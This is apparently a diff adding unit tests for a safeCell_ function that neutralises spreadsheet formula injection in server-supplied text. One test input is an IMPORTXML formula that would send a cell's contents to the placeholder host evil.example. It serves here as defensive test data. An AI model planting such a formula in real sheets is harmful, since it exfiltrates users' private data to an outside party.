@@ -73,6 +73,9 @@ const EXPORTS = [
   // The banner change. headerRow_ decides where every other row is, and the
   // row number is the contract's join key, so it is tested against a fake sheet.
   'headerRow_', 'firstDataRow_', 'resetHeaderRowCache_',
+  // Formula injection: a cell beginning with = is a live formula, and every
+  // one of these strings comes from the server.
+  'safeCell_',
 ];
 const box = {};
 new Function('box', `${src}\nObject.assign(box, {${EXPORTS.join(', ')}});`)(box);
@@ -687,6 +690,30 @@ function fakeSheet(name, grid) {
 
 eq('text is trimmed',
   box.noticeFrom_({ notice: { level: 'info', text: '  padded  ' } }).text, 'padded');
+
+// ---------------------------------------------------------------------------
+// safeCell_ — server text must never become a formula in a student's sheet.
+// ---------------------------------------------------------------------------
+{
+  const safe = box.safeCell_;
+  // The one that matters: this would run in the student's account, under their
+  // permissions, against the contacts Blotter is designed never to store.
+  eq('an IMPORTXML exfiltration is neutralised',
+    safe('=IMPORTXML("https://evil.example/?d="&A2,"//x")'),
+    '\'=IMPORTXML("https://evil.example/?d="&A2,"//x")');
+  ['=1+1', '+1', '-1', '@SUM(A1)', '\tstart'].forEach((v) =>
+    ok('neutralised: ' + JSON.stringify(v), safe(v).charAt(0) === "'"));
+
+  // Ordinary text must pass through untouched, or every notice reads oddly.
+  ['Blotter — all good.', 'Appeared in a thread with Jamie Diamond',
+   'jamie@jpmorgan.com', 'Liz Ream', '5 days', ''].forEach((v) =>
+    eq('untouched: ' + JSON.stringify(v), safe(v), v));
+
+  eq('null becomes an empty cell', safe(null), '');
+  eq('undefined becomes an empty cell', safe(undefined), '');
+  // A minus inside a sentence is not a leading minus.
+  eq('a dash mid-sentence is fine', safe('call cancelled - reschedule'), 'call cancelled - reschedule');
+}
 
 console.log(fails === 0
   ? `All ${checks} courier helper checks passed.`
